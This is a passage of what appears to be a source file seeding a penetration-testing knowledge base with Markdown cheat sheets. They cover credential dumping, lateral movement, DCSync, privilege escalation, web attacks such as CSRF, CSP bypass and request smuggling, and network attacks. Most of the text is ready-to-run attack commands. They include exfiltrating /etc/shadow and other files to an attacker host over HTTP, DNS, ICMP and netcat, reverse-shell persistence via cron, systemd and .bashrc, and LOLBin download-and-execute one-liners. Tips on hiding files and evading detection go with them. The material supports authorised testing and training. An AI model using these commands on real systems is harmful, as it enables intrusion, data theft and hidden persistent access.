sekurlsa::pth /user:admin /domain:. /ntlm:HASH
```

## Tips
- Requires admin/SYSTEM privileges
- Use `token::elevate` if running as admin but not SYSTEM
- Invoke-Mimikatz for PowerShell-based execution
- Consider LSASS dump + offline parsing to avoid detection
""",
    },
    {
        "title": "Lateral Movement Techniques",
        "category": "Post-Exploitation",
        "tags": "lateral-movement,psexec,wmi,winrm,pivoting",
        "content": """# Lateral Movement

## Overview
Move between systems using captured credentials.

## Techniques
```bash
# PsExec (Impacket)
psexec.py domain/user:password@target

# WMIExec
wmiexec.py domain/user:password@target

# SMBExec
smbexec.py domain/user:password@target

# Evil-WinRM
evil-winrm -i target -u user -p password

# RDP
xfreerdp /v:target /u:user /p:password

# WinRM (PowerShell)
Enter-PSSession -ComputerName target -Credential domain\\user
```

## Tips
- PsExec creates a service (noisy); WMI is stealthier
- Use pass-the-hash variants when only hashes are available
- Check for local admin reuse across machines
- Document every lateral hop for reporting
""",
    },
    {
        "title": "Active Directory Domain Enumeration",
        "category": "Post-Exploitation",
        "tags": "active-directory,bloodhound,domain,enumeration",
        "content": """# AD Domain Enumeration

## Overview
Map the Active Directory environment after initial access.

## Commands
```bash
# BloodHound collection
bloodhound-python -d domain.local -u user -p pass -c all -ns DC_IP

# SharpHound (on Windows)
SharpHound.exe --CollectionMethods All

# PowerView
Get-DomainUser
Get-DomainGroup -AdminCount
Get-DomainComputer
Find-LocalAdminAccess
Get-DomainTrust

# AD Module
Get-ADUser -Filter * -Properties *
Get-ADGroup -Filter * | Select Name
Get-ADGroupMember "Domain Admins"
```

## Tips
- BloodHound visualizes attack paths to Domain Admin
- Mark owned/compromised objects in BloodHound for path analysis
- Check for unconstrained delegation (high-value targets)
- GPO abuse can lead to mass compromise
""",
    },
    {
        "title": "Pivoting and Port Forwarding",
        "category": "Post-Exploitation",
        "tags": "pivoting,tunnel,port-forward,ssh,chisel",
        "content": """# Pivoting and Port Forwarding

## Overview
Access internal networks through compromised hosts.

## Techniques
```bash
# SSH Local Port Forward
ssh -L 8080:internal-host:80 user@pivot-host

# SSH Dynamic SOCKS Proxy
ssh -D 9050 user@pivot-host
# Then: proxychains nmap -sT internal-host

# SSH Remote Port Forward
ssh -R 8080:localhost:80 user@attacker

# Chisel
# Server (attacker):
chisel server --reverse --port 8000
# Client (pivot):
chisel client attacker:8000 R:socks

# Ligolo-ng
# Proxy (attacker):
ligolo-proxy -selfcert
# Agent (pivot):
ligolo-agent -connect attacker:11601 -ignore-cert
```

## Tips
- Use SOCKS proxies with proxychains for tool compatibility
- Chisel and Ligolo-ng work well without SSH access
- Double-pivot through multiple compromised hosts as needed
- Document network topology as you discover it
""",
    },
    {
        "title": "Data Exfiltration Techniques",
        "category": "Post-Exploitation",
        "tags": "exfiltration,data,transfer,encoding,covert",
        "content": """# Data Exfiltration

## Overview
Transfer data out of compromised environments.

## Methods
```bash
# HTTP (Python server on attacker)
python3 -m http.server 8000
# On target:
curl -X POST -d @/etc/shadow http://attacker:8000/

# DNS exfiltration
cat /etc/passwd | base64 | fold -w 60 | while read line; do nslookup $line.attacker.com; done

# ICMP
# Using xxd and ping
xxd -p secret.txt | while read line; do ping -c 1 -p $line attacker.com; done

# SMB (Windows)
copy C:\\secret.txt \\\\attacker\\share\\

# Netcat
nc attacker 4444 < secret.txt
```

## Tips
- Choose exfil method based on allowed egress protocols
- Encrypt data before exfiltration
- Split large files to avoid detection thresholds
- DNS exfil works when HTTP is blocked
""",
    },
    {
        "title": "Persistence Mechanisms - Linux",
        "category": "Post-Exploitation",
        "tags": "persistence,linux,backdoor,cron,ssh",
        "content": """# Linux Persistence

## Overview
Maintain access after initial compromise.

## Techniques
```bash
# SSH authorized_keys
echo "ssh-rsa AAAA... attacker" >> ~/.ssh/authorized_keys

# Cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'" | crontab -

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor

# .bashrc/.profile
echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1 &' >> ~/.bashrc

# SUID binary
cp /bin/bash /tmp/.hidden
chmod u+s /tmp/.hidden
# Execute: /tmp/.hidden -p
```

## Tips
- Use multiple persistence methods as backups
- Hide files with dot-prefix or in /tmp, /dev/shm
- Match timestamps with `touch -r reference_file`
""",
    },
    {
        "title": "Persistence Mechanisms - Windows",
        "category": "Post-Exploitation",
        "tags": "persistence,windows,registry,scheduled-task,backdoor",
        "content": """# Windows Persistence

## Overview
Maintain access on Windows systems.

## Techniques
```powershell
# Registry Run key
reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\payload.exe"

# Scheduled Task
schtasks /create /tn "WindowsUpdate" /tr "C:\\payload.exe" /sc onlogon /ru SYSTEM

# WMI Event Subscription
# Triggers payload on system startup

# DLL Hijacking
# Place malicious DLL in application search path

# Startup folder
copy payload.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

# Golden Ticket (domain persistence)
# Forge TGT with KRBTGT hash - survives password resets
```

## Tips
- Registry and scheduled tasks are most common
- Golden tickets persist until KRBTGT is rotated twice
- Use legitimate-looking names and paths
- Skeleton key: patch LSASS to accept any password
""",
    },
    {
        "title": "Post-Exploitation Enumeration Scripts",
        "category": "Post-Exploitation",
        "tags": "enumeration,linpeas,winpeas,privesc,automated",
        "content": """# Automated Post-Exploitation Enumeration

## Linux
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# linux-exploit-suggester
./linux-exploit-suggester.sh

# pspy (process monitoring without root)
./pspy64
```

## Windows
```powershell
# WinPEAS
winpeas.exe

# PowerUp
powershell -ep bypass -c "Import-Module .\\PowerUp.ps1; Invoke-AllChecks"

# Seatbelt
Seatbelt.exe -group=all

# SharpUp
SharpUp.exe

# Windows Exploit Suggester
systeminfo > sysinfo.txt
python windows-exploit-suggester.py --database 2024-01-01-mssb.xlsx --systeminfo sysinfo.txt
```

## Tips
- Run LinPEAS/WinPEAS first for comprehensive overview
- Pipe output to file for later analysis
- Use pspy on Linux to catch cron jobs and processes
""",
    },
    {
        "title": "File Transfer Methods",
        "category": "Post-Exploitation",
        "tags": "file-transfer,upload,download,tools",
        "content": """# File Transfer Methods

## Linux Targets
```bash
# wget/curl
wget http://attacker/file -O /tmp/file
curl http://attacker/file -o /tmp/file

# Netcat
# Receiver: nc -lvnp 4444 > file
# Sender: nc attacker 4444 < file

# Base64 encode/decode
base64 file > encoded.txt
# Transfer text, then:
base64 -d encoded.txt > file

# SCP
scp user@attacker:/path/file /tmp/file
```

## Windows Targets
```powershell
# PowerShell
Invoke-WebRequest http://attacker/file -OutFile C:\\temp\\file
(New-Object Net.WebClient).DownloadFile('http://attacker/file','C:\\temp\\file')

# Certutil
certutil -urlcache -split -f http://attacker/file C:\\temp\\file

# Bitsadmin
bitsadmin /transfer job http://attacker/file C:\\temp\\file

# SMB share
copy \\\\attacker\\share\\file C:\\temp\\file
```

## Tips
- certutil is often available and not blocked
- SMB transfers authenticate; use Impacket smbserver.py
- Base64 works when binary transfer is blocked
""",
    },
    {
        "title": "Living Off the Land (LOLBins)",
        "category": "Post-Exploitation",
        "tags": "lolbins,living-off-the-land,evasion,windows",
        "content": """# Living Off the Land Binaries (LOLBins)

## Overview
Use legitimate system binaries for malicious purposes to evade detection.

## Windows LOLBins
```powershell
# Download & Execute
certutil -urlcache -split -f http://attacker/payload.exe payload.exe
mshta http://attacker/payload.hta
rundll32 javascript:"\\..\\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc")

# Code Execution
regsvr32 /s /n /u /i:http://attacker/file.sct scrobj.dll
wmic process call create "cmd.exe /c payload.exe"
forfiles /p C:\\Windows /m notepad.exe /c "cmd /c payload.exe"

# Compile & Execute
csc.exe /out:C:\\temp\\payload.exe C:\\temp\\payload.cs
MSBuild.exe C:\\temp\\build.xml
```

## Tips
- Check LOLBAS project for full reference
- These bypass application whitelisting in many cases
- Combine with proxy-aware downloads for corporate environments
""",
    },
    {
        "title": "Password Cracking with Hashcat",
        "category": "Post-Exploitation",
        "tags": "hashcat,cracking,password,hash,gpu",
        "content": """# Password Cracking with Hashcat

## Overview
GPU-accelerated password hash cracking.

## Common Hash Modes
```bash
# NTLM
hashcat -m 1000 hashes.txt wordlist.txt

# NTLMv2
hashcat -m 5600 hashes.txt wordlist.txt

# Kerberoast (TGS-REP)
hashcat -m 13100 hashes.txt wordlist.txt

# AS-REP
hashcat -m 18200 hashes.txt wordlist.txt

# SHA-256
hashcat -m 1400 hashes.txt wordlist.txt

# bcrypt
hashcat -m 3200 hashes.txt wordlist.txt
```

## Rules & Masks
```bash
# Rule-based attack
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule

# Mask attack (8 char, upper+lower+digit+special)
hashcat -m 1000 hashes.txt ?u?l?l?l?l?l?d?s

# Hybrid (wordlist + mask)
hashcat -m 1000 hashes.txt wordlist.txt ?d?d?d?d
```

## Tips
- Use `--show` to display cracked hashes
- Combine rules for better coverage
- Check `hashcat --example-hashes` for hash identification
""",
    },
    {
        "title": "Token Impersonation and Potato Attacks",
        "category": "Post-Exploitation",
        "tags": "potato,token,impersonation,privilege-escalation,windows",
        "content": """# Token Impersonation & Potato Attacks

## Overview
Escalate from service accounts to SYSTEM via token impersonation.

## Prerequisites
- SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege

## Tools
```bash
# JuicyPotato (Windows Server 2016/2019)
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *

# PrintSpoofer (Windows 10/Server 2019+)
PrintSpoofer.exe -i -c cmd

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"

# SweetPotato
SweetPotato.exe -p cmd.exe -a "/c whoami"

# RoguePotato
RoguePotato.exe -r attacker_ip -e "cmd.exe /c whoami" -l 9999
```

## Tips
- Check `whoami /priv` for SeImpersonatePrivilege
- IIS/MSSQL service accounts typically have this privilege
- Different Potato variants work on different Windows versions
- PrintSpoofer is most reliable on modern Windows
""",
    },
    {
        "title": "DCSync Attack",
        "category": "Post-Exploitation",
        "tags": "dcsync,active-directory,domain-admin,replication",
        "content": """# DCSync Attack

## Overview
Replicate domain controller data to extract all password hashes.

## Prerequisites
- Replicating Directory Changes + Replicating Directory Changes All
- Typically: Domain Admins, Enterprise Admins, DC computer accounts

## Commands
```bash
# Impacket secretsdump
secretsdump.py domain.local/admin:password@DC_IP

# Specific user
secretsdump.py -just-dc-user administrator domain.local/admin:password@DC_IP

# Mimikatz
lsadump::dcsync /domain:domain.local /user:administrator
lsadump::dcsync /domain:domain.local /all /csv

# With hash
secretsdump.py -hashes :NTLM_HASH domain.local/admin@DC_IP
```

## Tips
- Once you have KRBTGT hash, create Golden Tickets
- Extract all hashes for offline cracking
- Check for accounts with DCSync rights (non-standard)
- This is often the final objective in AD assessments
""",
    },
    {
        "title": "SUID/SGID Exploitation",
        "category": "Post-Exploitation",
        "tags": "suid,sgid,linux,privesc,gtfobins",
        "content": """# SUID/SGID Binary Exploitation

## Overview
Exploit SUID binaries to escalate privileges on Linux.

## Discovery
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Both
find / -perm /6000 -type f 2>/dev/null
```

## Common Exploitable Binaries
```bash
# nmap (old versions with interactive)
nmap --interactive
!sh

# find
find . -exec /bin/sh -p \\;

# vim
vim -c ':!/bin/sh'

# python
python -c 'import os; os.execl("/bin/sh","sh","-p")'

# bash (with SUID)
/tmp/bash -p

# env
env /bin/sh -p

# Custom SUID binary (shared library injection)
# If binary loads libraries from writable path
```

## Tips
- Cross-reference findings with GTFOBins
- Custom/non-standard SUID binaries are priority targets
- Check if binary calls other programs without full path
- Shared library hijacking works on poorly compiled SUID bins
""",
    },
    # =========================================================================
    # WEB APPLICATION (18 articles)
    # =========================================================================
    {
        "title": "Directory and File Brute-Forcing",
        "category": "Web Application",
        "tags": "directory,brute-force,gobuster,ffuf,enumeration",
        "content": """# Directory & File Brute-Forcing

## Overview
Discover hidden directories and files on web servers.

## Commands
```bash
# Gobuster
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt

# Ffuf
ffuf -u http://example.com/FUZZ -w wordlist.txt

# With extensions
gobuster dir -u http://example.com -w wordlist.txt -x php,txt,bak,old

# Recursive
feroxbuster -u http://example.com -w wordlist.txt --depth 3

# Virtual host discovery
ffuf -u http://example.com -H "Host: FUZZ.example.com" -w subdomains.txt -fs 0
```

## Tips
- Start with common.txt, then use larger wordlists for thoroughness
- Filter by response size to eliminate false positives
- Check for backup files (.bak, .old, ~, .swp)
- Use recursion cautiously to avoid excessive requests
""",
    },
    {
        "title": "Burp Suite Essential Techniques",
        "category": "Web Application",
        "tags": "burp,proxy,intercept,repeater,intruder",
        "content": """# Burp Suite Essential Techniques

## Overview
Core Burp Suite workflows for web application testing.

## Key Features
- **Proxy**: Intercept and modify requests
- **Repeater**: Manually modify and resend requests
- **Intruder**: Automated fuzzing and brute-forcing
- **Scanner**: Automated vulnerability detection (Pro)

## Workflow
1. Configure browser proxy (127.0.0.1:8080)
2. Browse target to populate site map
3. Identify interesting parameters
4. Send to Repeater for manual testing
5. Use Intruder for automated fuzzing

## Useful Extensions
- Autorize (IDOR testing)
- Logger++ (advanced logging)
- Param Miner (hidden parameter discovery)
- JWT Editor (token manipulation)

## Tips
- Use scope to focus on target domains
- Match/Replace rules for automatic header injection
- Macro recorder for handling multi-step auth flows
- Use Collaborator for out-of-band detection
""",
    },
    {
        "title": "IDOR - Insecure Direct Object Reference",
        "category": "Web Application",
        "tags": "idor,access-control,authorization,api",
        "content": """# IDOR Testing

## Overview
Access unauthorized resources by manipulating object identifiers.

## Techniques
```
# Numeric ID manipulation
GET /api/users/1001 → GET /api/users/1002

# UUID guessing/leaking
# Check other endpoints that expose IDs

# Parameter pollution
GET /api/users?id=1001&id=1002

# HTTP method switching
GET /api/users/1002 (blocked) → PUT /api/users/1002 (allowed?)

# Path traversal in API
GET /api/users/1001/../1002
```

## Testing Steps
1. Create two accounts with different privilege levels
2. Capture requests with identifiers (user IDs, document IDs)
3. Swap identifiers between accounts
4. Check for horizontal (same role) and vertical (different role) access

## Tips
- Automate with Burp Autorize extension
- Check all CRUD operations (not just read)
- Look for ID leakage in other responses
- Test encoded/hashed IDs too (they may be predictable)
""",
    },
    {
        "title": "Authentication Testing Methodology",
        "category": "Web Application",
        "tags": "authentication,login,bypass,brute-force,2fa",
        "content": """# Authentication Testing

## Overview
Systematic testing of authentication mechanisms.

## Checks
```
# Default credentials
admin:admin, admin:password, root:root

# Username enumeration
- Different error messages for valid/invalid users
- Response timing differences
- Account lockout only for valid users

# Password reset flaws
- Predictable tokens
- Token not invalidated after use
- Host header injection in reset emails

# 2FA bypass
- Response manipulation (change 403 to 200)
- Brute-force short codes
- Backup codes
- Race conditions

# Session management
- Session fixation
- Cookie without Secure/HttpOnly flags
- Predictable session IDs
```

## Tips
- Check for rate limiting on login endpoints
- Test remember-me functionality for insecure tokens
- OAuth misconfiguration (open redirect in callback)
- Try accessing authenticated pages directly (forced browsing)
""",
    },
    {
        "title": "CSRF - Cross-Site Request Forgery",
        "category": "Web Application",
        "tags": "csrf,cross-site,request-forgery,token",
        "content": """# CSRF Testing

## Overview
Force authenticated users to perform unintended actions.

## Testing
```html
<!-- Basic CSRF PoC -->
<form action="http://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit" value="Click me">
</form>

<!-- Auto-submit -->
<script>document.forms[0].submit();</script>

<!-- JSON CSRF (if Content-Type not validated) -->
<form action="http://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}' type="hidden">
</form>
```

## Bypass Techniques
- Remove CSRF token entirely
- Use another user's valid token
- Change POST to GET
- Change Content-Type
- Subdomain cookie injection

## Tips
- Check SameSite cookie attribute (Lax/Strict prevents most CSRF)
- State-changing GET requests are always vulnerable
- CORS misconfiguration can enable CSRF-like attacks
""",
    },
    {
        "title": "API Security Testing",
        "category": "Web Application",
        "tags": "api,rest,graphql,testing,owasp",
        "content": """# API Security Testing

## Overview
Systematic approach to testing REST and GraphQL APIs.

## REST API Checks
```bash
# Enumerate endpoints
# Check documentation: /swagger, /api-docs, /openapi.json

# Test HTTP methods
curl -X OPTIONS http://api.example.com/endpoint

# Authentication bypass
# Remove auth header, use expired tokens, try other users' tokens

# Rate limiting
# Send rapid requests to check for throttling

# Mass assignment
# Add extra fields in POST/PUT requests
POST /api/users {"name":"test","role":"admin","isAdmin":true}

# BOLA/IDOR
# Iterate through resource IDs
```

## GraphQL
```graphql
# Introspection
{__schema{types{name,fields{name}}}}

# Query depth attacks
{user{friends{friends{friends{name}}}}}

# Batching attacks
[{"query":"mutation{login(user:\"a\",pass:\"1\")}"}, ...]
```

## Tips
- Always test with and without authentication
- Check for verbose error messages leaking info
- Test input validation on all parameters
- Look for deprecated API versions still accessible
""",
    },
    {
        "title": "Content Security Policy Bypass",
        "category": "Web Application",
        "tags": "csp,bypass,xss,headers,security",
        "content": """# CSP Bypass Techniques

## Overview
Bypass Content Security Policy to achieve XSS execution.

## Common Bypasses
```
# JSONP endpoints on whitelisted domains
<script src="https://whitelisted.com/jsonp?callback=alert(1)//"></script>

# Angular CDN on whitelist
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp><p ng-click=$event.view.alert(1)>click</p></div>

# Base URI manipulation (if base-uri not set)
<base href="http://attacker.com/">

# data: URI (if allowed)
<script src="data:text/javascript,alert(1)"></script>

# Nonce reuse/prediction
# If nonce is static or predictable
```

## Analysis
```bash
# Check CSP header
curl -I https://example.com | grep -i content-security-policy

# Use Google CSP Evaluator
# https://csp-evaluator.withgoogle.com/
```

## Tips
- Check for unsafe-inline, unsafe-eval in script-src
- Whitelisted CDNs often host exploitable libraries
- Report-only mode doesn't enforce (information gathering only)
""",
    },
    {
        "title": "Web Cache Poisoning",
        "category": "Web Application",
        "tags": "cache,poisoning,headers,web,xss",
        "content": """# Web Cache Poisoning

## Overview
Manipulate cached responses to serve malicious content to other users.

## Techniques
```
# Unkeyed header injection
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http
X-Original-URL: /admin

# Parameter cloaking
GET /page?utm_content=x%0d%0aX-Injected:header

# Fat GET requests
GET /page HTTP/1.1
Content-Length: 30

param=malicious_value

# Cache key normalization
/page → /PAGE (case difference not in key)
/page? → /page (trailing ? stripped)
```

## Tools
```bash
# Param Miner (Burp extension) for finding unkeyed inputs
# Web Cache Vulnerability Scanner
wcvs -u https://example.com
```

## Tips
- Look for X-Cache, Age, CF-Cache-Status headers
- Test during low traffic to avoid affecting real users
- Unkeyed headers are the most common attack vector
- CDNs and reverse proxies are primary targets
""",
    },
    {
        "title": "Subdomain Takeover",
        "category": "Web Application",
        "tags": "subdomain,takeover,dns,cname,dangling",
        "content": """# Subdomain Takeover

## Overview
Claim abandoned subdomains pointing to decommissioned services.

## Detection
```bash
# Find CNAME records
dig sub.example.com CNAME

# Check for dangling records
# If CNAME points to unregistered service:
# - GitHub Pages: Check if repo/org exists
# - S3: Check if bucket exists
# - Heroku: Check if app exists
# - Azure: Check if resource exists

# Automated tools
subjack -w subdomains.txt -t 100 -v
nuclei -t takeovers/ -l subdomains.txt
```

## Vulnerable Services
- GitHub Pages (404 with specific text)
- AWS S3 (NoSuchBucket)
- Heroku (No such app)
- Azure (NXDOMAIN from azure resources)
- Shopify, Fastly, Pantheon, etc.

## Tips
- Check for fingerprints in error responses
- NS delegation takeover is highest impact
- Always verify with the client before claiming
- Document the claim process as evidence
""",
    },
    {
        "title": "HTTP Request Smuggling",
        "category": "Web Application",
        "tags": "smuggling,http,desync,chunked,web",
        "content": """# HTTP Request Smuggling

## Overview
Exploit discrepancies between front-end and back-end HTTP parsing.

## Techniques
```
# CL.TE (front uses Content-Length, back uses Transfer-Encoding)
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL (front uses Transfer-Encoding, back uses Content-Length)
POST / HTTP/1.1
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

# TE.TE (obfuscate Transfer-Encoding)
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-encoding: chunked
```

## Detection
- Send ambiguous requests and observe behavior
- Use timing differences to detect desync
- Burp Scanner detects some variants automatically

## Tips
- Can lead to cache poisoning, auth bypass, request hijacking
- HTTP/2 downgrade can introduce new smuggling vectors
- Test with care; smuggling affects other users' requests
""",
    },
    {
        "title": "WordPress Penetration Testing",
        "category": "Web Application",
        "tags": "wordpress,cms,wpscan,plugins,themes",
        "content": """# WordPress Penetration Testing

## Overview
Systematic approach to testing WordPress installations.

## Commands
```bash
# WPScan full enumeration
wpscan --url http://example.com -e ap,at,u

# Enumerate plugins
wpscan --url http://example.com -e ap --plugins-detection aggressive

# Brute-force login
wpscan --url http://example.com -U admin -P wordlist.txt

# Check for vulnerable plugins
wpscan --url http://example.com -e vp

# Manual checks
curl http://example.com/wp-json/wp/v2/users  # User enumeration
curl http://example.com/xmlrpc.php           # XML-RPC enabled?
```

## Key Files
- /wp-config.php (database credentials)
- /wp-content/debug.log (error details)
- /wp-content/uploads/ (uploaded files)
- /.htaccess (configuration)

## Tips
- XML-RPC allows amplified brute-force (multicall)
- Plugin vulnerabilities are the most common entry point
- Check for wp-config.php.bak or wp-config.php~ backups
- Author archive pages leak usernames (?author=1)
""",
    },
    {
        "title": "OWASP Top 10 Quick Reference",
        "category": "Web Application",
        "tags": "owasp,top-10,methodology,web,checklist",
        "content": """# OWASP Top 10 2021 Quick Reference

## A01: Broken Access Control
- IDOR, privilege escalation, forced browsing
- Test: switch user tokens, access other users' resources

## A02: Cryptographic Failures
- Sensitive data in transit/at rest without encryption
- Test: check TLS config, look for plaintext secrets

## A03: Injection
- SQL, NoSQL, OS command, LDAP injection
- Test: fuzz all input parameters with injection payloads

## A04: Insecure Design
- Business logic flaws, missing security controls
- Test: abuse intended workflows in unintended ways

## A05: Security Misconfiguration
- Default configs, unnecessary features, verbose errors
- Test: check headers, error pages, default credentials

## A06: Vulnerable Components
- Outdated libraries and frameworks
- Test: identify versions, check CVE databases

## A07: Authentication Failures
- Weak passwords, missing brute-force protection
- Test: credential stuffing, session management

## A08: Software and Data Integrity Failures
- Insecure deserialization, unsigned updates
- Test: tamper with serialized data, CI/CD security

## A09: Security Logging Failures
- Missing or inadequate logging
- Test: verify security events are logged

## A10: SSRF
- Server-side request forgery
- Test: manipulate URLs to access internal services
""",
    },
    {
        "title": "SSL/TLS Testing",
        "category": "Web Application",
        "tags": "ssl,tls,certificate,cipher,vulnerability",
        "content": """# SSL/TLS Security Testing

## Overview
Assess TLS configuration for weaknesses.

## Commands
```bash
# testssl.sh (comprehensive)
testssl.sh https://example.com

# Nmap SSL scripts
nmap --script ssl-enum-ciphers -p 443 example.com

# OpenSSL manual checks
openssl s_client -connect example.com:443
openssl s_client -connect example.com:443 -tls1
openssl s_client -connect example.com:443 -cipher NULL

# Check certificate details
openssl s_client -connect example.com:443 | openssl x509 -noout -text

# SSLyze
sslyze example.com
```

## Key Checks
- Protocol support (disable SSLv3, TLS 1.0, 1.1)
- Weak ciphers (RC4, DES, NULL, EXPORT)
- Certificate validity and chain
- HSTS header presence
- Known vulns: Heartbleed, POODLE, ROBOT, DROWN

## Tips
- Use testssl.sh for comprehensive automated testing
- Check for certificate transparency logs
- Verify HSTS preload list inclusion for critical sites
""",
    },
    {
        "title": "Prototype Pollution",
        "category": "Web Application",
        "tags": "prototype,pollution,javascript,nodejs,web",
        "content": """# Prototype Pollution

## Overview
Modify JavaScript object prototypes to affect application behavior.

## Detection
```javascript
// Client-side test
// In URL: ?__proto__[test]=polluted
// Then check: ({}).test === "polluted"

// Common payloads
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true

// JSON body
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
```

## Server-Side (Node.js)
```javascript
// If merge/clone functions don't sanitize keys:
const payload = JSON.parse('{"__proto__":{"admin":true}}');
merge({}, payload);
// Now: ({}).admin === true
```

## Impact
- Denial of service
- Property injection leading to auth bypass
- RCE in certain Node.js configurations (child_process)

## Tips
- Test all JSON endpoints accepting nested objects
- Look for lodash.merge, jQuery.extend (older versions)
- Server-side pollution can lead to RCE
""",
    },
    # =========================================================================
    # NETWORK (15 articles)
    # =========================================================================
    {
        "title": "ARP Spoofing and MITM",
        "category": "Network",
        "tags": "arp,spoofing,mitm,bettercap,network",
        "content": """# ARP Spoofing & Man-in-the-Middle

## Overview
Intercept network traffic by poisoning ARP caches.

## Commands
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Bettercap
bettercap -iface eth0
> net.probe on
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> net.sniff on

# Ettercap
ettercap -Tq -i eth0 -M arp:remote /target1// /target2//

# arpspoof (dsniff)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
```

## Tips
- Only works on local network segments (same broadcast domain)
- Use SSLStrip for HTTPS downgrade (if no HSTS)
- Capture credentials from unencrypted protocols
- Modern switches with Dynamic ARP Inspection prevent this
""",
    },
    {
        "title": "Network Sniffing and Packet Capture",
        "category": "Network",
        "tags": "wireshark,tcpdump,packet,capture,sniffing",
        "content": """# Network Sniffing & Packet Capture

## Overview
Capture and analyze network traffic for credentials and intelligence.

## Commands
```bash
# Tcpdump basics
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 port 80
tcpdump -i eth0 host 192.168.1.1

# Filter specific protocols
tcpdump -i eth0 'tcp port 21'  # FTP
tcpdump -i eth0 'udp port 53'  # DNS

# Capture credentials (cleartext protocols)
tcpdump -i eth0 -A 'port 21 or port 23 or port 110'

# Wireshark filters
http.request.method == "POST"
ftp.request.command == "PASS"
tcp.flags.syn == 1 && tcp.flags.ack == 0
```

## Tips
- Focus on cleartext protocols: FTP, Telnet, HTTP, SMTP
- Use display filters in Wireshark for analysis
- Export HTTP objects for file extraction
- Check for broadcast traffic leaking information
""",
    },
    {
        "title": "VLAN Hopping",
        "category": "Network",
        "tags": "vlan,hopping,trunk,switch,network",
        "content": """# VLAN Hopping

## Overview
Access traffic on other VLANs through switch misconfigurations.

## Techniques
```bash
# Switch Spoofing (DTP)
# Negotiate trunk link with switch
yersinia -I  # Interactive mode
# Select DTP protocol, enable trunking

# Double Tagging
# Craft frame with two 802.1Q tags
# Outer tag = native VLAN, Inner tag = target VLAN
scapy:
sendp(Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst="target")/ICMP())

# Frogger (VLAN hopping tool)
frogger --interface eth0 --target-vlan 100
```

## Mitigations (for reporting)
- Disable DTP on all access ports
- Set native VLAN to unused VLAN ID
- Explicitly configure trunk ports
- Enable VLAN access lists

## Tips
- Switch spoofing requires DTP to be enabled (default on many Cisco)
- Double tagging only works one-way (useful for DoS/blind attacks)
- Test from actual network jacks, not just VMs
""",
    },
    {
        "title": "IPv6 Attack Techniques",
        "category": "Network",
        "tags": "ipv6,mitm6,network,relay,attack",
        "content": """# IPv6 Attack Techniques

## Overview
Exploit IPv6 in dual-stack networks where it's often unmonitored.

## Commands
```bash
# mitm6 - IPv6 DNS takeover
mitm6 -d domain.local

# Combine with ntlmrelayx
ntlmrelayx.py -6 -t ldaps://dc.domain.local -wh attacker.domain.local -l loot

# IPv6 scanning
nmap -6 fe80::1%eth0

# Discover IPv6 hosts
alive6 eth0

# Router advertisement flood
flood_router6 eth0
```

## Key Attacks
- SLAAC spoofing: become default gateway via RA
- DNS takeover via DHCPv6 (mitm6)
- Relay NTLM auth to LDAPS for account creation

## Tips
- Many networks have IPv6 enabled but unmonitored
- mitm6 + ntlmrelayx is devastating in AD environments
- Can create machine accounts and dump credentials
- Works even when IPv4 MITM defenses are in place
""",
    },
    {
        "title": "Firewall and IDS Evasion",
        "category": "Network",
        "tags": "firewall,ids,evasion,nmap,fragmentation",
        "content": """# Firewall & IDS Evasion

## Overview
Bypass network security controls during penetration tests.

## Nmap Evasion
```bash
# Fragment packets
nmap -f 192.168.1.1

# Set MTU
nmap --mtu 24 192.168.1.1

# Decoy scan
nmap -D RND:10 192.168.1.1

# Idle/zombie scan
nmap -sI zombie_host 192.168.1.1

# Source port manipulation
nmap --source-port 53 192.168.1.1

# Data length padding
nmap --data-length 200 192.168.1.1

# Timing (slow scan)
nmap -T0 192.168.1.1
```

## Other Techniques
- Encrypt payloads (SSL/TLS tunneling)
- Use allowed protocols (DNS, HTTPS) for tunneling
- Fragment at multiple layers
- Encode payloads (base64, XOR, custom)

## Tips
- Source port 53 (DNS) and 80 (HTTP) often pass through firewalls
- Slow scans avoid rate-based IDS triggers
- Test from outside and inside network segments
""",
    },
    {
        "title": "SSH Tunneling and Port Forwarding",
        "category": "Network",
        "tags": "ssh,tunnel,port-forward,socks,network",
        "content": """# SSH Tunneling

## Overview
Create encrypted tunnels through SSH for pivoting and access.

## Commands
```bash
# Local port forward (access remote:8080 via localhost:9090)
ssh -L 9090:remote-internal:8080 user@jump-host

# Remote port forward (expose local:3000 on remote:8080)
ssh -R 8080:localhost:3000 user@remote-server

